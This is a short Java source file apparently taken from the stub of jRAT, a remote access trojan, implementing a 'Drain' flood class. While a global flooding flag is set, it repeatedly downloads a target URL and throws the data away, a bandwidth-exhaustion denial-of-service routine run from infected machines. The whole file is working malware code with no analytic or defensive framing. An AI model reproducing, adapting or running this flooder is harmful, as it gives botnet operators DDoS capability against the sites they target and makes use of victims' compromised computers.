package pro.jrat.stub.flood;

import java.io.BufferedInputStream;
import java.net.URL;

import pro.jrat.stub.Constants;

public class Drain implements Runnable {

	public String target;

	public Drain(String t) {
		target = t;
	}

	@SuppressWarnings("unused")
	public void run() {
		while (Constants.flooding) {
			try {
				BufferedInputStream in = new BufferedInputStream(new URL(target).openStream());
				byte data[] = new byte[1024];
				int count;
				while ((count = in.read(data, 0, 1024)) != -1) {
					// fout.write(data, 0, count);
				}
				in.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
